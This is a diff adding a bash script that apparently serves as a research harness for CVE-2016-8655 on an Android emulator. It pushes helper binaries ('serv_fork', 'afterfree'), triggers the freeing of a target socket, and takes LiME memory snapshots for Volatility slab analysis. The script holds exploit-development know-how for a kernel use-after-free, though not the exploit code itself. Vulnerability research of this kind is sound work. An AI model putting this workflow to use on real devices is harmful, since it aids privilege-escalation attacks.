@@ -1,0 +1,78 @@
+#!/bin/bash
+
+servfork() {
+    adb push serv_fork /data/local/tmp
+    adb shell /data/local/tmp/serv_fork &
+}
+
+freetargetsock() {
+    echo "sending a char"
+    echo -e 'b\n' > /tmp/svr-input
+}
+
+createsocks() {
+    mkfifo /tmp/svr-input
+    adb push afterfree /data/local/tmp 
+    tail -f /tmp/svr-input | adb shell /data/local/tmp/afterfree $1 | tee /dev/tty >/tmp/pkt-output & 
+    thepid=$(adb shell ps | awk '/afterfree/{print $2;}' | tr '\n' ' ')
+}
+
+getinode() {
+    inode=$(cat /tmp/pkt-output | awk '/inode/{print $4}')
+}
+
+cleanup() {
+    #cleanup
+    adb shell kill ${thepid}
+    adb shell wait $thepid
+    
+    adb emu -s emulator-5554 emu stop
+    adb emu -s emulator-5554 emu kill
+    pkill -9 emulator
+    echo done
+}
+
+
+startemu() {
+    nice ~/android-sdk-linux/tools/emulator -avd asdf -no-window -no-boot-anim -kernel /home/marto/zImage -show-kernel -debug init -sdcard /home/marto/sdcard >/tmp/emu.log &
+    adb wait-for-device
+}
+
+snapshot() {
+    # wait for sdcard to stat
+    adb shell 'while [ ! -d /sdcard/LOST.DIR ]; do echo waiting sdcard; sleep 1; done'
+    adb shell rm /sdcard/lime.ok
+    echo "Taking Snapshot $1"
+    adb shell insmod /data/local/tmp/lime-goldfish.ko "path=/sdcard/lime.ok format=lime"
+    sleep 20
+    icat ~/sdcard 8 >${1}
+    locrom="$(pwd)/${1}"
+    adb shell rmmod lime
+    cd ~/CVE-2016-8655_Android/volatility
+    python vol.py -f $locrom  --profile LinuxGoldfish-asdf-3_4ARM linux_slabinfo > /tmp/result$$
+    cd -
+    if grep "size-1024" /tmp/result$$; then 
+        rm /tmp/result$$
+        echo "Done Snapshot"
+        return;
+    fi
+    rm /tmp/result$$
+    snapshot $1
+}
+
+startemu
+echo "device ready"
+echo "start server"
+servfork
+createsocks $1
+echo "sleeping for 15"
+sleep 15
+getinode
+echo "target inode is: $inode"
+snapshot notfree.lime
+echo "free the target sock"
+freetargetsock
+snapshot freed.lime
+echo "sleeping for 15"
+sleep 15
+cleanup
